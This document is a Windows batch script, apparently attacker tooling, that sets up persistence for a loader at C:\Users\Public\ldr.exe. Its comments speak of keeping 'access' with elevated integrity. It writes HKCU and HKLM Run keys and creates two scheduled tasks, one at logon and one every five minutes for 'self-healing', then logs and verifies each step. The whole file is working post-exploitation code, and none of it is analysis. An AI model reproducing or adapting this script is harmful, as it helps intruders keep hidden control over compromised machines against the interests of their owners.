@echo off
REM persist_ldr.bat - argument-free persistence setup for C:\Users\Public\ldr.exe
REM Two independent mechanisms so one failing does not cost us access:
REM   Run key   -> starts at user logon (HKCU works as vix, HKLM needs the high IL we have)
REM   schtasks  -> starts at logon AND every 5 minutes = self-healing
REM The loader's single-instance mutex makes repeats no-ops instead of process pile-up.
setlocal
set EXE=C:\Users\Public\ldr.exe
set OUT=C:\Users\Public\persist.txt
del "%OUT%" 2>nul
echo == payload %EXE% >> "%OUT%"
echo == HKCU Run >> "%OUT%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v lcs /t REG_SZ /d "%EXE%" /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == HKLM Run >> "%OUT%"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v lcs /t REG_SZ /d "%EXE%" /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == task onlogon >> "%OUT%"
schtasks /create /tn lcs_onlogon /tr "%EXE%" /sc onlogon /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == task every 5 min >> "%OUT%"
schtasks /create /tn lcs_5min /tr "%EXE%" /sc minute /mo 5 /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == verify >> "%OUT%"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v lcs >> "%OUT%" 2>&1
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v lcs >> "%OUT%" 2>&1
schtasks /query /tn lcs_onlogon /fo list | findstr /C:"TaskName" >> "%OUT%" 2>&1
schtasks /query /tn lcs_5min /fo list | findstr /C:"TaskName" >> "%OUT%" 2>&1
echo == end %TIME% >> "%OUT%"
endlocal
